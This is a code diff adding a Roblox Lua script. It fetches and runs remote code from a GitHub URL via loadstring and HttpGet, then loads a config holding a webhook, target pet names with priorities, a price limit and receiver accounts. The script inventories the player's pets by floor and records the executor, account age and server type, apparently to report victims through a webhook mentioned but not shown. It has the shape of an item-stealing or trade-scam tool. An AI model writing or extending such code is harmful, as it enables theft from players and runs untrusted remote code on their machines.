@@ -1,0 +1,142 @@
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local localPlayer = player
+
+-- Parse price helper
+local function parsePrice(priceText)
+    local number = tonumber((priceText or ""):match("[%d%.]+")) or 0
+    if (priceText or ""):find("K") then
+        return number * 1000
+    elseif (priceText or ""):find("M") then
+        return number * 1000000
+    elseif (priceText or ""):find("B") then
+        return number * 1000000000
+    else
+        return number
+    end
+end
+
+-- Load remote config
+local config = {}
+do
+    local ok, res = pcall(function()
+        return loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-IDP/tsetging234/refs/heads/main/config"))()
+    end)
+    if ok and type(res) == "table" then
+        config = res
+    else
+        config = {
+            WEBHOOK = "",
+            PRICE_LIMIT = 0,
+            targetNames = {},
+            Displayname = "",
+            Receiver = {}
+        }
+    end
+end
+
+local WEBHOOK = config.WEBHOOK
+local PRICE_LIMIT = config.PRICE_LIMIT
+local targetNames = config.targetNames or {}
+local receiverList = table.concat(config.Receiver or {}, ", ")
+
+-- Priority & shuffle
+local function getPriority(name)
+    for _, t in ipairs(targetNames) do
+        if name and t.name and name:find(t.name) then
+            return t.priority
+        end
+    end
+    return math.huge
+end
+
+local function shuffle(tbl)
+    for i = #tbl, 2, -1 do
+        local j = math.random(i)
+        tbl[i], tbl[j] = tbl[j], tbl[i]
+    end
+end
+
+-- Scan your base for all pets (replaces scanBrainrots)
+local function scanBrainrots()
+    local found = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return found end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame") then
+            local label = sign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+            if label and label.Text:find(player.DisplayName) then
+                local podiums = plot:FindFirstChild("AnimalPodiums")
+                if podiums then
+                    for _, podium in ipairs(podiums:GetChildren()) do
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        local attachment = spawn and spawn:FindFirstChild("Attachment")
+                        local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+                        if overhead then
+                            local displayName = overhead:FindFirstChild("DisplayName")
+                            local petName = (displayName and displayName.Text) or "Unknown"
+                            -- Determine floor from podium name
+                            local floor = "Unknown Floor"
+                            local num = tonumber(podium.Name:match("^(%d+)_?"))
+                            if num then
+                                if num >= 1 and num <= 10 then floor = "1st Floor"
+                                elseif num >= 11 and num <= 18 then floor = "2nd Floor"
+                                else floor = "3rd Floor" end
+                            end
+                            table.insert(found, {name = petName, floor = floor})
+                        end
+                    end
+                end
+                break -- stop after your base
+            end
+        end
+    end
+    return found
+end
+
+-- Detect executor
+local function detectExecutor()
+    local executor = "Unknown"
+    if syn then executor = "Synapse X"
+    elseif KRNL_LOADED then executor = "KRNL"
+    elseif fluxus then executor = "Fluxus"
+    elseif secure_load then executor = "Sentinel"
+    elseif getexecutorname then executor = getexecutorname()
+    elseif identifyexecutor then executor = identifyexecutor() end
+    return executor
+end
+
+-- Account age
+local function getAccountAge()
+    return player and player.AccountAge or 0
+end
+
+-- Server type detection
+local map = Workspace:FindFirstChild("Map")
+local serverType = "UNKNOWN"
+if map then
+    local codes = map:FindFirstChild("Codes")
+    if codes then
+        local main = codes:FindFirstChild("Main")
+        if main then
+            local surfaceGui = main:FindFirstChild("SurfaceGui")
+            if surfaceGui then
+                local sFrame = surfaceGui:FindFirstChild("MainFrame")
+                if sFrame then
+                    local privateMsg = sFrame:FindFirstChild("PrivateServerMessage")
+                    serverType = (privateMsg and privateMsg.Visible) and "PRIVATE SERVER" or "PUBLIC SERVER"
+                end
+            end
+        end
+    end
+end
+
+-- (The rest of your code, including sendWebhook and GUI, stays the same)
